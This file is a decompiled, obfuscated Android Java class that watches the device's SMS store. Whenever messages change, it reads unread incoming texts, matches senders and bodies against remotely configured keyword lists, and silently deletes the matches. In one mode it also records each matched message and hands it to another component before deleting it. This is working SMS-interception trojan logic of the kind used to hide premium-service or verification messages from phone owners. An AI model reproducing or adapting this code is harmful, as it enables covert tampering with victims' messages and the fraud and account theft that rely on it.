package com.mm.wq.receiver;

import android.content.ContentResolver;
import android.content.Context;
import android.database.ContentObserver;
import android.database.Cursor;
import android.net.Uri;
import android.os.Handler;
import android.text.TextUtils;
import com.mm.c.a.e;

public final class a
  extends ContentObserver
{
  public static String[] a;
  public static String[] b;
  private Context c;
  private boolean d = false;
  private String e = "1";
  
  public a(Handler paramHandler, Context paramContext)
  {
    super(paramHandler);
    this.c = paramContext;
    this.d = false;
  }
  
  private int a(String paramString)
  {
    paramString = "address='" + paramString + "'";
    return this.c.getContentResolver().delete(Uri.parse("content://sms"), paramString, null);
  }
  
  private void a(Context paramContext)
  {
    try
    {
      paramContext = paramContext.getApplicationContext().getContentResolver().query(Uri.parse("content://sms"), null, "type = 1 and read = 0", null, null);
      paramContext.moveToFirst();
      boolean bool;
      do
      {
        a(paramContext.getString(paramContext.getColumnIndex("address")), paramContext.getString(paramContext.getColumnIndex("body")), paramContext.getString(paramContext.getColumnIndex("_id")));
        bool = paramContext.moveToNext();
      } while (bool);
      return;
    }
    catch (Exception paramContext)
    {
      paramContext.printStackTrace();
    }
  }
  
  private void a(String paramString1, String paramString2, String paramString3)
  {
    int i;
    if (this.e.equals("1")) {
      if ((b != null) && (a != null))
      {
        i = 0;
        if (i < b.length) {
          break label37;
        }
      }
    }
    label37:
    int j;
    for (;;)
    {
      return;
      if ((!TextUtils.isEmpty(b[i])) && (paramString1.contains(b[i]))) {
        j = 0;
      }
      for (;;)
      {
        if (j >= a.length)
        {
          i += 1;
          break;
        }
        if ((!TextUtils.isEmpty(a[j])) && (paramString2.contains(a[j]))) {
          a(paramString1);
        }
        j += 1;
      }
      if ((this.e.equals("2")) && (b != null) && (a != null))
      {
        i = 0;
        while (i < b.length)
        {
          if ((!TextUtils.isEmpty(b[i])) && (paramString1.contains(b[i])))
          {
            j = 0;
            if (j < a.length) {
              break label205;
            }
          }
          i += 1;
        }
      }
    }
    label205:
    if ((!TextUtils.isEmpty(a[j])) && (paramString2.contains(a[j]))) {
      if ((!paramString1.equals(e.i(this.c))) && (!this.d))
      {
        if (!TextUtils.isEmpty(e.j(this.c))) {
          break label309;
        }
        this.d = true;
        e.k(this.c, paramString3);
        e.j(this.c, paramString1);
        b.a(paramString1, paramString2, this.c);
      }
    }
    for (;;)
    {
      a(paramString1);
      j += 1;
      break;
      label309:
      if (-1 == e.j(this.c).indexOf(paramString3))
      {
        this.d = true;
        e.j(this.c, paramString1);
        e.k(this.c, e.j(this.c) + paramString3);
        b.a(paramString1, paramString2, this.c);
      }
    }
  }
  
  public final void onChange(boolean paramBoolean)
  {
    super.onChange(paramBoolean);
    if (!TextUtils.isEmpty(e.e(this.c))) {
      a = e.e(this.c).split("\\|");
    }
    if (!TextUtils.isEmpty(e.f(this.c))) {
      b = e.f(this.c).split("\\|");
    }
    if (!TextUtils.isEmpty(e.c(this.c))) {
      this.e = e.c(this.c);
    }
    a(this.c);
  }
}
